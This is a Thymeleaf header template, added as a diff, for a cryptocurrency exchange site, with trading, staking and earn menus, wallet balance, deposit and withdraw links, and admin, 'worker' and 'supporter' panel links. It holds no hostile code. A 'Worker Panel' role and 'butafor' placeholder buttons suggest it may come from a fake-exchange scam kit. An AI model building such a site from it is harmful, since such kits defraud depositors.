@@ -1,0 +1,377 @@
+<header class="header" th:fragment="header">
+  <div class="header__wrapper">
+    <div class="header__logo" onclick="location.replace('../')">
+      <div class="header__logo-icon">
+        <img style="width: 30px; margin-bottom: -3px;" th:src="${site_icon}">
+      </div>
+      <th:block th:text="${site_name}"></th:block>
+    </div>
+    <div class="header__links">
+      <div class="header__links-wrapper">
+        <a class="header__link" href="trading">
+          <div style="all: unset" th:text="#{header.link.trading}"></div>
+        </a>
+        <a class="header__link" href="swap">
+          <div style="all: unset" th:text="#{swap}"></div>
+          <span class="header__link-new">0%</span>
+        </a>
+        <div class="header__link header__link-trade">
+          <div class="header__link-wrapper">
+            <div style="all: unset" th:text="#{header.link.derivatives}"></div>
+            <div class="header__link-arrow">
+              <svg width="11" height="8" viewbox="0 0 11 8" fill="none" xmlns="http://www.w3.org/2000/svg">
+                <path d="M1.34502 3.10642L4.95202 7.05416C5.49516 7.64861 6.37253 7.64861 6.91567 7.05416L10.5227 3.10642C11.4 2.14616 10.7733 0.5 9.53388 0.5H2.31989C1.08042 0.5 0.467644 2.14616 1.34502 3.10642Z" fill="white"></path>
+              </svg>
+            </div>
+          </div>
+          <div class="header__more">
+            <a class="header__more-link butafor__btn" href="#">
+              <div class="header__more-img">
+                <img src="../assets/img/header/futures.png" alt="">
+              </div>
+              <div class="header__more-wrapper">
+                <div class="header__more-name" th:text="#{header.link.futures}"></div>
+                <div class="header__more-description" th:text="#{header.link.futures.description}"></div>
+              </div>
+            </a>
+            <a class="header__more-link butafor__btn" href="#">
+              <div class="header__more-img">
+                <img src="../assets/img/header/options.png" alt="">
+              </div>
+              <div class="header__more-wrapper">
+                <div class="header__more-name" th:text="#{header.more.options.name}"></div>
+                <div class="header__more-description" th:text="#{header.more.options.description}"></div>
+              </div>
+            </a>
+          </div>
+        </div>
+        <div class="header__link header__link-tools">
+          <div class="header__link-wrapper">
+            <div style="all: unset" th:text="#{header.tools}"></div>
+            <div class="header__link-arrow">
+              <svg width="11" height="8" viewbox="0 0 11 8" fill="none" xmlns="http://www.w3.org/2000/svg">
+                <path d="M1.34502 3.10642L4.95202 7.05416C5.49516 7.64861 6.37253 7.64861 6.91567 7.05416L10.5227 3.10642C11.4 2.14616 10.7733 0.5 9.53388 0.5H2.31989C1.08042 0.5 0.467644 2.14616 1.34502 3.10642Z" fill="white"></path>
+              </svg>
+            </div>
+          </div>
+          <div class="header__more">
+            <a class="header__more-link" href="market-crypto">
+              <div class="header__more-img">
+                <img src="../assets/img/header/cap.png" alt="">
+              </div>
+              <div class="header__more-wrapper">
+                <div class="header__more-name" th:text="#{header.more.marketcap.name}"></div>
+                <div class="header__more-description" th:text="#{header.more.marketcap.description}"></div>
+              </div>
+            </a>
+            <a class="header__more-link" href="market-screener">
+              <div class="header__more-img">
+                <img src="../assets/img/header/screener.png" alt="">
+              </div>
+              <div class="header__more-wrapper">
+                <div class="header__more-name" th:text="#{header.more.marketscreener.name}"></div>
+                <div class="header__more-description" th:text="#{header.more.marketscreener.description}"></div>
+              </div>
+            </a>
+            <a class="header__more-link" href="technical-analysis">
+              <div class="header__more-img">
+                <img src="../assets/img/header/tech.png" alt="">
+              </div>
+              <div class="header__more-wrapper">
+                <div class="header__more-name" th:text="#{header.more.technicalanalysis.name}"></div>
+                <div class="header__more-description" th:text="#{header.more.technicalanalysis.description}"></div>
+              </div>
+            </a>
+            <a class="header__more-link" href="cross-rates">
+              <div class="header__more-img">
+                <img src="../assets/img/header/rates.png" alt="">
+              </div>
+              <div class="header__more-wrapper">
+                <div class="header__more-name" th:text="#{header.more.crossrates.name}"></div>
+                <div class="header__more-description" th:text="#{header.more.crossrates.description}"></div>
+              </div>
+            </a>
+            <a class="header__more-link" href="heat-map">
+              <div class="header__more-img">
+                <img src="../assets/img/header/heat.png" alt="">
+              </div>
+              <div class="header__more-wrapper">
+                <div class="header__more-name" th:text="#{header.more.heatmap.name}"></div>
+                <div class="header__more-description" th:text="#{header.more.heatmap.description}"></div>
+              </div>
+            </a>
+          </div>
+        </div>
+        <a class="header__link" href="staking">
+          <div style="all: unset" th:text="#{header.staking}"></div>
+          <span class="header__link-hot">HOT</span>
+        </a>
+        <div class="header__link header__link-earn">
+          <div class="header__link-wrapper">
+            <div style="all: unset" th:text="#{header.earn}"></div>
+            <div class="header__link-arrow">
+              <svg width="11" height="8" viewbox="0 0 11 8" fill="none" xmlns="http://www.w3.org/2000/svg">
+                <path d="M1.34502 3.10642L4.95202 7.05416C5.49516 7.64861 6.37253 7.64861 6.91567 7.05416L10.5227 3.10642C11.4 2.14616 10.7733 0.5 9.53388 0.5H2.31989C1.08042 0.5 0.467644 2.14616 1.34502 3.10642Z" fill="white"></path>
+              </svg>
+            </div>
+          </div>
+          <div class="header__more">
+            <a class="header__more-link" href="trade-bot">
+              <div class="header__more-img">
+                <img src="../assets/img/header/cap.png" alt="">
+              </div>
+              <div class="header__more-wrapper">
+                <div class="header__more-name" style="display: inline;">
+                  <div style="all: unset" th:text="#{header.trading.bot}"></div>
+                  <span class="header__link-hot" style="display: inline; font-size: 12px" th:text="#{header.hot}"></span>
+                </div>
+
+                <div class="header__more-description" th:text="#{header.more.tradebot.description}"></div>
+              </div>
+            </a>
+            <a class="header__more-link" href="copy-trading">
+              <div class="header__more-img">
+                <img src="../assets/img/header/copy.png" alt="">
+              </div>
+              <div class="header__more-wrapper">
+                <div class="header__more-name" th:text="#{header.more.copytrading.name}"></div>
+                <div class="header__more-description" th:text="#{header.more.copytrading.description}"></div>
+              </div>
+            </a>
+            <a class="header__more-link" href="trading-bots">
+              <div class="header__more-img">
+                <img src="../assets/img/header/bots.png" alt="">
+              </div>
+              <div class="header__more-wrapper">
+                <div class="header__more-name" th:text="#{header.more.tradingbots.name}"></div>
+                <div class="header__more-description" th:text="#{header.more.tradingbots.description}"></div>
+              </div>
+            </a>
+            <a class="header__more-link" href="launchpad">
+              <div class="header__more-img">
+                <img src="../assets/img/header/launchpad.png" alt="">
+              </div>
+              <div class="header__more-wrapper">
+                <div class="header__more-name" th:text="#{header.more.launchpad.name}"></div>
+                <div class="header__more-description" th:text="#{header.more.launchpad.description}"></div>
+              </div>
+            </a>
+            <a class="header__more-link" href="space">
+              <div class="header__more-img">
+                <img src="../assets/img/header/space.png" alt="">
+              </div>
+              <div class="header__more-wrapper">
+                <div class="header__more-name" th:text="#{header.more.spacetraveller.name}"></div>
+                <div class="header__more-description" th:text="#{header.more.spacetraveller.description}"></div>
+              </div>
+            </a>
+            <a class="header__more-link" href="savings">
+              <div class="header__more-img">
+                <img src="../assets/img/header/savings.png" alt="">
+              </div>
+              <div class="header__more-wrapper">
+                <div class="header__more-name" th:text="#{header.more.savings.name}"></div>
+                <div class="header__more-description" th:text="#{header.more.savings.description}"></div>
+              </div>
+            </a>
+            <a class="header__more-link" href="stake-eth20">
+              <div class="header__more-img">
+                <img src="../assets/img/header/eth20.png" alt="">
+              </div>
+              <div class="header__more-wrapper">
+                <div class="header__more-name" th:text="#{header.more.eth20staking.name}"></div>
+                <div class="header__more-description" th:text="#{header.more.eth20staking.description}"></div>
+              </div>
+            </a>
+          </div>
+        </div>
+        <div class="header__link header__link-more">
+          <div class="header__link-wrapper">
+            <div style="all: unset" th:text="#{header.more}"></div>
+            <div class="header__link-arrow">
+              <svg width="11" height="8" viewbox="0 0 11 8" fill="none" xmlns="http://www.w3.org/2000/svg">
+                <path d="M1.34502 3.10642L4.95202 7.05416C5.49516 7.64861 6.37253 7.64861 6.91567 7.05416L10.5227 3.10642C11.4 2.14616 10.7733 0.5 9.53388 0.5H2.31989C1.08042 0.5 0.467644 2.14616 1.34502 3.10642Z" fill="white"></path>
+              </svg>
+            </div>
+          </div>
+          <div class="header__more">
+            <a class="header__more-link" href="p2p">
+              <div class="header__more-img">
+                <img src="../assets/img/header/p2p.png" alt="">
+              </div>
+              <div class="header__more-wrapper">
+                <div class="header__more-name" th:text="#{header.p2p}"></div>
+                <div class="header__more-description" th:text="#{header.p2p.descr}"></div>
+              </div>
+            </a>
+            <a th:if="${payment_settings != null && payment_settings.transakEnabled}" class="header__more-link" href="buy-crypto">
+              <div class="header__more-img">
+                <img src="../assets/img/header/card.png" alt="">
+              </div>
+              <div class="header__more-wrapper">
+                <div class="header__more-name" th:text="#{header.buy.crypto}"></div>
+                <div class="header__more-description" th:text="#{header.buy.crypto.descr}"></div>
+              </div>
+            </a>
+            <a class="header__more-link" href="token-listing">
+              <div class="header__more-img">
+                <img src="../assets/img/header/tokenlist.png" alt="">
+              </div>
+              <div class="header__more-wrapper">
+                <div class="header__more-name" th:text="#{header.token.listing}"></div>
+                <div class="header__more-description" th:text="#{header.token.listing.descr}"></div>
+              </div>
+            </a>
+            <a class="header__more-link" href="institutions">
+              <div class="header__more-img">
+                <img src="../assets/img/header/inst.png" alt="">
+              </div>
+              <div class="header__more-wrapper">
+                <div class="header__more-name" th:text="#{header.institutional.home}"></div>
+                <div class="header__more-description" th:text="#{header.institutional.home.descr(${site_name})}"></div>
+              </div>
+            </a>
+            <a class="header__more-link" href="cards">
+              <div class="header__more-img">
+                <img src="../assets/img/header/card.svg" alt="">
+              </div>
+              <div class="header__more-wrapper">
+                <div class="header__more-name" th:text="#{header.card(${site_name})}"></div>
+                <div class="header__more-description" th:text="#{header.card.descr}"></div>
+              </div>
+            </a>
+            <a class="header__more-link" href="ventures">
+              <div class="header__more-img">
+                <img src="../assets/img/header/ventures.png" alt="">
+              </div>
+              <div class="header__more-wrapper">
+                <div class="header__more-name" th:text="#{header.ventures(${site_name})}"></div>
+                <div class="header__more-description" th:text="#{header.ventures.descr(${site_name})}"></div>
+              </div>
+            </a>
+          </div>
+        </div>
+        <a class="header__link" href="support">
+          <div style="all: unset" th:text="#{header.support}"></div>
+          <div th:if="${support_unviewed != null && support_unviewed > 0}">
+            <style>
+              @keyframes blink {
+                0% { opacity: 1; }
+                50% { opacity: 0; }
+                100% { opacity: 1; }
+              }
+            </style>
+            <span style="color: #fff; margin-left: 4px; background: #d0303a; display: inline-block; width: 20px; height: 20px; line-height: 20px; border-radius: 50%; text-align: center; font-size: 12px; animation: blink 1s infinite;" th:text="${support_unviewed}"></span>
+          </div>
+        </a>
+        <a class="header__link" href="../profile/buy-crypto">
+          Buy crypto
+        </a>
+        <a class="header__link" href="../profile/wallet" th:text="#{header.wallet(${total_usd_balance})}">
+        </a>
+      </div>
+    </div>
+    <div th:replace="~{fragments/language-container.html :: container}"></div>
+    <div class="header__right">
+      <div class="header__user">
+        <div class="header__user-btn">
+          <div th:text="${user.username}" class="header__user-name">
+          </div>
+          <div class="header__user-img">
+            <picture>
+              <source th:srcset="${user.profilePhoto == null ? '../assets/img/profile/avatar.svg' : '../' + user.profilePhoto}" type="image/webp">
+              <img th:src="${user.profilePhoto == null ? '../assets/img/profile/avatar.svg' : '../' + user.profilePhoto}" alt="">
+            </picture>
+          </div>
+        </div>
+        <div class="header-menu__bg">
+          <div class="header-menu">
+            <div class="header-menu__overview">
+              <div class="header-menu__overview-info">
+                <div class="header-menu__overview-img">
+                  <img src="../assets/img/header/wallet-overview.svg" alt="">
+                </div>
+                <div class="header-menu__overview-wrapper">
+                  <div class="header-menu__overview-title" th:text="#{header.assets}"></div>
+                  <div class="header-menu__overview-value">
+                    <span th:text="${total_usd_balance}"></span> USD
+                  </div>
+                </div>
+              </div>
+              <div class="header-menu__overview-links">
+                <a class="header-menu__overview-link" href="deposit">
+                  <img src="../assets/img/header/wallet-add.svg" alt="">
+                  <div style="all: unset" th:text="#{profile.deposit}"></div>
+                </a>
+                <a class="header-menu__overview-link" href="withdraw">
+                  <img src="../assets/img/header/withdraw.svg" alt="">
+                  <div style="all: unset" th:text="#{profile.withdraw}"></div>
+                </a>
+              </div>
+            </div>
+            <div class="header-menu__links">
+              <a th:if="${user.isAdmin()}" style="color: orange;" class="header-menu__links-link" href="../admin-panel">
+                <img src="../assets/img/header/admin.svg" alt="">
+                Admin Panel
+              </a>
+              <a th:if="${user.isWorker()}" style="color: orange;" class="header-menu__links-link" href="../worker-panel">
+                <img src="../assets/img/header/admin.svg" alt="">
+                Worker Panel
+              </a>
+              <a th:if="${user.isSupporter()}" style="color: orange;" class="header-menu__links-link" href="../supporter-panel">
+                <img src="../assets/img/header/admin.svg" alt="">
+                Supporter Panel
+              </a>
+              <a class="header-menu__links-link" href="../profile/wallet">
+                <img src="../assets/img/header/wallet-menu.svg" alt="">
+                <div style="all: unset" th:text="#{wallet}"></div>
+              </a>
+              <a class="header-menu__links-link" href="settings">
+                <img src="../assets/img/header/settings.svg" alt="">
+                <div style="all: unset" th:text="#{header.settings}"></div>
+              </a>
+              <a class="header-menu__links-link" href="verification">
+                <img src="../assets/img/header/verification.svg" alt="">
+                <div style="all: unset" th:text="#{header.verification}"></div>
+              </a>
+              <a class="header-menu__links-link" href="promo-codes">
+                <img src="../assets/img/header/codes.svg" alt="">
+                <div style="all: unset" th:text="#{header.gift}"></div>
+              </a>
+              <a class="header-menu__links-link" href="support">
+                <img src="../assets/img/header/support.svg" alt="">
+                <div style="all: unset" th:text="#{header.support}"></div>
+              </a>
+            </div>
+            <div class="header-menu__user">
+              <div class="header-menu__user-container">
+                <a class="header-menu__user-img" href="#">
+                  <picture>
+                    <source th:srcset="${user.profilePhoto == null ? '../assets/img/profile/avatar.svg' : '../' + user.profilePhoto}" type="image/webp">
+                    <img th:src="${user.profilePhoto == null ? '../assets/img/profile/avatar.svg' : '../' + user.profilePhoto}" alt="">
+                  </picture>
+                </a>
+                <div class="header-menu__user-wrapper">
+                  <div th:text="${user.username}" class="header-menu__user-nickname">
+                  </div>
+                  <div th:text="${user.email}" class="header-menu__user-mail">
+                  </div>
+                </div>
+              </div>
+              <div class="header-menu__user-exit" onclick="location.replace('../api/auth/logout')">
+                <img src="../assets/img/header/exit.svg" alt="">
+              </div>
+            </div>
+          </div>
+        </div>
+      </div>
+      <div class="header__btn-mobile">
+        <svg width="35" height="35" viewbox="0 0 100 100">
+          <path class="header__nav-line header__nav-line1" d="M 20,29.000046 H 80.000231 C 80.000231,29.000046 94.498839,28.817352 94.532987,66.711331 94.543142,77.980673 90.966081,81.670246 85.259173,81.668997 79.552261,81.667751 75.000211,74.999942 75.000211,74.999942 L 25.000021,25.000058"></path>
+          <path class="header__nav-line header__nav-line2" d="M 20,50 H 80"></path>
+          <path class="header__nav-line header__nav-line3" d="M 20,70.999954 H 80.000231 C 80.000231,70.999954 94.498839,71.182648 94.532987,33.288669 94.543142,22.019327 90.966081,18.329754 85.259173,18.331003 79.552261,18.332249 75.000211,25.000058 75.000211,25.000058 L 25.000021,74.999942"></path>
+        </svg>
+      </div>
+    </div>
+  </div>
+</header>
